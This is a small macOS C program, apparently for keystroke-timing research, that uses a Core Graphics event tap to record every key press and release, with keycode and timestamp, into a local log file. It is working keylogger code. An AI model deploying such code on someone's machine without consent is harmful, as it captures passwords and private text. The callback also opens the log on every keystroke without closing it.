#include <stdio.h>
#include <time.h>
#import <ApplicationServices/ApplicationServices.h>

#include "utils.h"

CGEventRef eventTapCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) 
{
  	FILE *file = fopen("keydam.log", "a");
    fprintf(file, "%u,%llx,%ld\n", (uint32_t)type,CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode), sysTimeInMillis());
    fflush(file);
 	return event; 
}


CFMachPortRef createEventTap(CGEventTapCallBack eventTrapCallback)
{
	/* 
	   Created an event tap as a com channel to listen to events
	   kCGSessionEventTap: Specifies that an event tap is placed at the point where HID system and remote control events enter a login session.
	   kCGHeadInsertEventTap: Specifies that a new event tap should be inserted before any pre-existing event taps at the same location
	   0: passive listener or an active filter
	   kCGEventMaskForAllEvents
	   mask: bit mask for the events to listen to
	   eventTrapCallback: the callback on the event
	   NULL: A pointer to user-defined data. This pointer is passed into the callback function specified in the callback parameter
	*/

    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventKeyUp);
	return CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, mask, eventTapCallback, NULL);

}


void listenToKeyBoardEvents(CFMachPortRef eventTap) 
{
 	CFRunLoopSourceRef runLoopSource;

	/* To listen for messages you need to create a run loop source */
	runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);

	/* Adds a CFRunLoopSource object to a run loop mode. */
	CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
}


int main (int argc, const char * argv[]) 
{
	CFRunLoopSourceRef runLoopSource; 
	CFMachPortRef eventTap = createEventTap(eventTapCallback);

	listenToKeyBoardEvents(eventTap);
	/* Enables or disables an event tap. */
	CGEventTapEnable(eventTap, true);
	CFRunLoopRun();
	return 0;
}
